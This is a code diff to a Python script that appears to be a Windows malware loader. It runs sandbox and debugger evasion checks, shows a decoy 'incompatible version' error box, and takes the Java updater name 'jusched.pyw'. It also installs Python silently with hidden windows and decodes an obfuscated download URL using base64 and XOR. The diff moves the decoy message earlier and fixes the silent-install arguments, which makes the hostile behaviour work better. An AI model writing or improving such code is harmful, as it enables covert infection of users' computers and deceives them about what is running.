@@ -156,6 +156,9 @@ def GetPython():
 
 if not (Ch3ckCPU() and Ch3ckRAM() and Ch3ckR38() and Ch3ckNum0fPr0c() and Ch3ckD11() and Ch3ckT1tl35() and Ch3ckUpt1m3() and CheckIsDebuggerPr3s3n7() and Ch3ckScr33nS1z3() and Ch3ckF0rBlackl1st3dNam3s()):
     sys.exit()
+
+ctypes.windll.user32.MessageBoxW(0, "This program cannot run on your computer, incompatible version", "Incompatible version", 0x10)
+
 Ch3ckM0us3M0v3()
 for i in range(0, 30000):
     a = i
@@ -167,8 +170,6 @@ scriptName = "jusched.pyw"
 
 Cr3at3F1le()
 
-ctypes.windll.user32.MessageBoxW(0, "This program cannot run on your computer, incompatible version", "Incompatible version", 0x10)
-
 basePath = f"C:\\Users\\{os.getlogin()}\\bin"
 if not os.path.exists(basePath):
     os.mkdir(basePath)
@@ -176,8 +177,8 @@ if not os.path.exists(basePath):
 Cr3at3F1le()
 print("nothing house love man apple car")
 
-subprocess.run(["curl", "https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe", "-o", f"{basePath}/python_installer.exe"], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
-subprocess.run([f"{basePath}/python_installer.exe", "/quiet PrependPath=1 Include_test=0"], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
+subprocess.run(["curl", "https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe", "-o", f"{basePath}\\python_installer.exe"], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
+subprocess.run([f"{basePath}/python_installer.exe", "/quiet", "PrependPath=1", "Include_test=0"], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
 
 downloadUrl = base64.b64decode("DxIcFRpPXEgZEA1EAQscGR8FBxYKAQkIBRoWHxNICwoEWjkSCh8bKSkQHBgQSAYAHAdHFQ4eXAMCABtKARASAxheFwsPDEcDCxNcFRY=").decode("utf-8")
 downloadUrl = XorString(downloadUrl, "gfheiusgkqzjfbhqjgreosjgknsq")
